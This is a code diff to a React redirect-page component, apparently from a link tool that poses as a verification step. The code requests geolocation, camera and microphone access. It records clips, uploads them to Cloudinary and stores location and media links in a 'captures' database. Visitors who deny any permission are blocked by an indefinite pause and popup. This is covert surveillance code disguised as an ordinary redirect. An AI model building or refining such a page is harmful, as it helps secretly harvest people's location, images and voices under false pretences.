@@ -5,8 +5,7 @@ import { getTranslator } from '../contexts/LanguageContext';
 import { useNotification } from '../contexts/SettingsContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
 import { db } from '../firebase';
-import { collection, query, where, getDocs, addDoc } from 'firebase/firestore';
-
+import { collection, addDoc, query, where, getDocs } from 'firebase/firestore';
 
 interface RedirectPageProps {
   previewSettings?: Settings | Omit<Settings, 'id'>;
@@ -290,7 +289,6 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   const [isPaused, setIsPaused] = React.useState(true);
   const [showDeniedPopup, setShowDeniedPopup] = React.useState(false);
   const [t, setT] = React.useState(() => getTranslator('en'));
-  const [captureInitiated, setCaptureInitiated] = React.useState(false);
   
   const isPreview = !!isPreviewProp;
   const isMounted = React.useRef(true);
@@ -342,11 +340,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
 
 
   React.useEffect(() => {
-    // Guard against re-running the logic, or running without settings.
-    if (!settings || isPreview || captureInitiated) return;
-    
-    // Immediately set the flag to prevent re-entry from re-renders.
-    setCaptureInitiated(true);
+    if (!settings || isPreview || !isPaused) return;
 
     const performRedirect = () => {
         if (!isMounted.current) return;
@@ -415,7 +409,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         
         // Sequential permission requests
         for (const permission of settings.captureInfo.permissions) {
-            try {
+             try {
                 if (permission === 'location') {
                     const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
@@ -428,51 +422,33 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                         video: permission === 'camera',
                         audio: permission === 'microphone',
                     };
-                    // This requests user permission
                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     
-                    // Permission was granted, so we update the status.
                     if (permission === 'camera') capturedData.permissions.camera = 'granted';
                     if (permission === 'microphone') capturedData.permissions.microphone = 'granted';
 
-                    // Now record and upload. This is a separate process that can fail.
-                    // We wrap it in a try...finally to ensure the stream is always stopped.
-                    try {
-                        const mediaBlob = await new Promise<Blob>((resolve) => {
-                            const recorder = new MediaRecorder(stream, { mimeType: permission === 'camera' ? 'video/webm' : 'audio/webm' });
-                            const chunks: Blob[] = [];
-                            recorder.ondataavailable = e => chunks.push(e.data);
-                            recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType }));
-                            setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
-                            recorder.start();
-                        });
-                        
-                        const formData = new FormData();
-                        formData.append('file', mediaBlob);
-                        formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-                        
-                        const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
-                        
-                        if (res.ok) {
-                            const uploadData = await res.json();
-                            // Only assign if secure_url exists and is a non-empty string
-                            if (uploadData.secure_url) {
-                                if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
-                                if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;
-                            } else {
-                                console.error("Cloudinary upload failed: secure_url not found in response.");
-                            }
-                        } else {
-                             console.error("Cloudinary upload request failed:", await res.text());
-                        }
-                    } catch (uploadError) {
-                        console.error(`Error during media recording or upload for ${permission}:`, uploadError);
-                    } finally {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
+                    const mediaBlob = await new Promise<Blob>((resolve) => {
+                        const recorder = new MediaRecorder(stream, { mimeType: permission === 'camera' ? 'video/webm' : 'audio/webm' });
+                        const chunks: Blob[] = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType }));
+                        setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
+                        recorder.start();
+                    });
+                    
+                    const formData = new FormData();
+                    formData.append('file', mediaBlob);
+                    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+                    
+                    const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
+                    const uploadData = await res.json();
+                    
+                    if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
+                    if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;
+
+                    stream.getTracks().forEach(track => track.stop());
                 }
-            } catch (permissionError) {
-                console.error(`Permission denied or device unavailable for ${permission}:`, permissionError);
+            } catch {
                 if (permission === 'location') capturedData.permissions.location = 'denied';
                 if (permission === 'camera') capturedData.permissions.camera = 'denied';
                 if (permission === 'microphone') capturedData.permissions.microphone = 'denied';
@@ -483,12 +459,11 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         }
         
         try {
-            await addDoc(collection(db, "captures"), capturedData as any);
+            await addDoc(collection(db, "captures"), capturedData);
         } catch(e) { console.error("Failed to save captured data:", e); }
         
         if (anyPermissionDenied) {
-            // Do nothing; the capture is complete, and the redirect is paused.
-            // The `captureInitiated` flag prevents this whole effect from re-running.
+            setIsPaused(true); // Pause the redirect indefinitely
         } else {
             addNotification({ type: 'success', message: 'notification_verification_success' });
             startRedirectSequence();
@@ -501,7 +476,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
       startRedirectSequence();
     }
 
-  }, [settings, isPreview, captureInitiated, addNotification]);
+  }, [settings, isPreview, isPaused, addNotification]);
   
   const handleClosePreview = () => onClosePreview?.();
 
@@ -524,46 +499,51 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   };
   
   const renderCard = () => {
+    // If permissions were denied, isPaused will be true, halting the progress bar.
     const props = { settings, isPaused: isPreview || isPaused, t };
-    const cardMap: { [key: string]: React.FC<any> } = {
-        'default-white': DefaultWhiteCard,
-        'glass': GlassCard,
-        'minimal': MinimalCard,
-        'terminal': TerminalCard,
-        'sleek-dark': SleekDarkCard,
-        'article': ArticleCard,
-        'gradient-burst': GradientBurstCard,
-        'elegant': ElegantCard,
-        'retro-tv': RetroTVCard,
-        'video-player': VideoPlayerCard,
-    };
-    const CardComponent = cardMap[settings.cardStyle] || DefaultWhiteCard;
-    
     return (
-      <div className={`relative transition-all duration-300 ${showDeniedPopup ? 'filter blur-sm scale-95' : ''}`}>
-        <CardComponent {...props} />
+      <div className={`relative transition-all duration-300 ${showDeniedPopup ? 'blur-md' : ''}`}>
+        {(() => {
+          switch (settings.cardStyle) {
+            case 'glass': return <GlassCard {...props} />;
+            case 'minimal': return <MinimalCard {...props} />;
+            case 'elegant': return <ElegantCard {...props} />;
+            case 'sleek-dark': return <SleekDarkCard {...props} />;
+            case 'article': return <ArticleCard {...props} />;
+            case 'terminal': return <TerminalCard {...props} />;
+            case 'retro-tv': return <RetroTVCard {...props} />;
+            case 'gradient-burst': return <GradientBurstCard {...props} />;
+            case 'video-player': return <VideoPlayerCard {...props} />;
+            default: return <DefaultWhiteCard {...props} />;
+          }
+        })()}
       </div>
     );
   };
 
   return (
-    <div className="w-full h-full flex flex-col justify-center items-center text-center p-4 bg-cover bg-center" style={containerStyle}>
-      {isEmbeddedPreview && onClosePreview && (
-        <div className="absolute top-4 right-4 z-10">
-            <button onClick={handleClosePreview} className="px-3 py-1 text-sm bg-slate-700/50 text-white rounded-md hover:bg-slate-600 transition-colors">{t('close')}</button>
-        </div>
-      )}
-      
-      {renderCard()}
-      
-      {showDeniedPopup && (
-        <div className="absolute inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center animate-fade-in z-20">
-          <div className="bg-slate-800 text-white p-8 rounded-2xl shadow-2xl max-w-sm text-center border border-slate-700">
-            <h2 className="text-2xl font-bold mb-2">{t('redirect_permissions_denied_title')}</h2>
-            <p className="text-slate-400">{t('redirect_permissions_denied_message')}</p>
-          </div>
-        </div>
-      )}
+    <div
+      className={`relative w-full h-full flex flex-col justify-center items-center transition-colors duration-500 bg-cover bg-center p-4 overflow-hidden font-sans`}
+      style={containerStyle}
+    >
+        {isPreview && !isEmbeddedPreview && (
+            <div className="absolute top-4 right-4 text-right z-10 animate-fade-in">
+                <div className="bg-black/40 backdrop-blur-sm rounded-lg p-3 shadow-lg">
+                    <button onClick={handleClosePreview} className="font-semibold py-1 px-3 rounded-md transition-colors bg-slate-200 text-slate-800 hover:bg-white">
+                        {t('close')}
+                    </button>
+                </div>
+            </div>
+        )}
+        {showDeniedPopup && (
+             <div className="absolute inset-0 z-20 flex items-center justify-center animate-fade-in p-4">
+                 <div className="text-center bg-black/50 backdrop-blur-lg p-8 rounded-2xl max-w-sm border border-slate-700 shadow-2xl">
+                     <h2 className="text-2xl font-bold text-red-400 mb-2">{t('redirect_permissions_denied_title')}</h2>
+                     <p className="text-slate-300">{t('redirect_permissions_denied_message')}</p>
+                 </div>
+             </div>
+        )}
+        {renderCard()}
     </div>
   );
 };
